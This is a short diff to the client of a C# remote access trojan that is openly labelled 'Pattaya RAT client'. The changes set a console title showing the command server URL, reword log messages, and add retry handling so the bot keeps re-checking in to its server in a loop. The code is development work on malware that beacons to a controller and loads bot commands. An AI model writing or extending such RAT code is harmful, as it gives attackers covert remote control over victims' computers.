@@ -19,6 +19,8 @@ namespace pattaya_project_client
         private static BotCharacter _character;
         static async Task Main(string[] args)
         {
+            Console.Title = $"Pattaya RAT client version: {Config.Version} | Server URL {Config.BotServer}";
+
             _character = Utils.BotUtil.GenerateChracter();
             LoadBotCommands();
             _tokenSource = new CancellationTokenSource();
@@ -40,7 +42,7 @@ namespace pattaya_project_client
 
             _client.OnConnected += async (sender, e) =>
             {
-                Console.WriteLine($"Bot has been connected to server: {Config.BotServer}");
+                Console.WriteLine($"Pattaya Bot has been connected to server: {Config.BotServer}");
                 await _client.EmitAsync(Config.BotCheckIn, _character);
 
             };
@@ -51,14 +53,24 @@ namespace pattaya_project_client
 
                 while (!_tokenSource.IsCancellationRequested)
                 {
-                    Console.WriteLine("PATTAYAAAA is Good :)");
+                    
                     Thread.Sleep(Config.SignalDelay);
-                    await _client.EmitAsync(Config.BotCheckIn, _character);
+                    try
+                    {
+                        await _client.EmitAsync(Config.BotCheckIn, _character);
+                        Console.WriteLine("Pattaya bot re-checkin");
+                    }
+                    catch (Exception)
+                    {
+
+                        Console.WriteLine("Pattaya bot re-checkin failed");
+                    }
+                    
                 }
             }
             catch (Exception)
             {
-                Console.WriteLine("PATTAYAAAA is died :(");
+                Console.WriteLine("Pattaya connection timeout");
             }
 
 
